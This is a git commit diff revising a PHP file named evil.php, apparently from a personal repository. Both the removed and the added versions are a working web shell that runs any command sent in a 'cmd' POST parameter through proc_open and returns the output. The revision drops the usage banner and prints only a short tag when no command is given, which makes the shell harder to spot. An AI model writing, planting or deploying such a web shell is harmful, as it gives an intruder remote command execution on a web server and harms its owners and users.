78364e94af0fbed3803178d5de4744f3bac06e20
al4xs <michaelklaan@gmail.com>
2024-11-30 15:52:44 -0300

    change evil3

--- evil.php
+++ evil.php
@@ -1,48 +1,25 @@
 <?php
-// Verifica se o parâmetro 'cmd' foi enviado via POST
-if (isset($_POST['cmd'])) {
-    $cmd = $_POST['cmd'];
-
-    // Se a função proc_open não estiver desabilitada
-    if (function_exists('proc_open')) {
-        // Descritores de entrada, saída e erro
-        $descriptorspec = array(
-            0 => array("pipe", "r"),  // stdin
-            1 => array("pipe", "w"),  // stdout
-            2 => array("pipe", "w")   // stderr
-        );
-
-        // Usando proc_open para rodar o comando
-        $process = proc_open($cmd, $descriptorspec, $pipes);
-
+if (isset($_POST["cmd"])) {
+    $cmd = $_POST["cmd"];
+    function exec_command($command)
+    {
+        $descriptorspec = [
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["file", "error-output.txt", "a"],
+        ];
+        $cwd = "";
+        $env = ["some_option" => "aeiou"];
+        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
         if (is_resource($process)) {
-            // Captura a saída do comando (stdout)
-            $output = stream_get_contents($pipes[1]);
-
-            // Captura erros, se houver (stderr)
-            $error = stream_get_contents($pipes[2]);
-
-            // Fecha os pipes
-            fclose($pipes[0]);
+            echo stream_get_contents($pipes[1]);
             fclose($pipes[1]);
-            fclose($pipes[2]);
-
-            // Fecha o processo
             proc_close($process);
-
-            // Exibe a saída do comando ou erro
-            echo "<pre>$output</pre>";
-            if ($error) {
-                echo "<pre>Error: $error</pre>";
-            }
-        } else {
-            echo "Erro ao executar o comando.";
         }
-    } else {
-        echo "A função proc_open não está disponível.";
     }
+    exec_command($cmd);
+    exit();
 } else {
-    // Caso o parâmetro 'cmd' não tenha sido enviado, mostra uma mensagem
-    echo "Shell interativa. Envie um comando via POST usando o parâmetro 'cmd'.";
+    echo "al4xs";
 }
 ?>
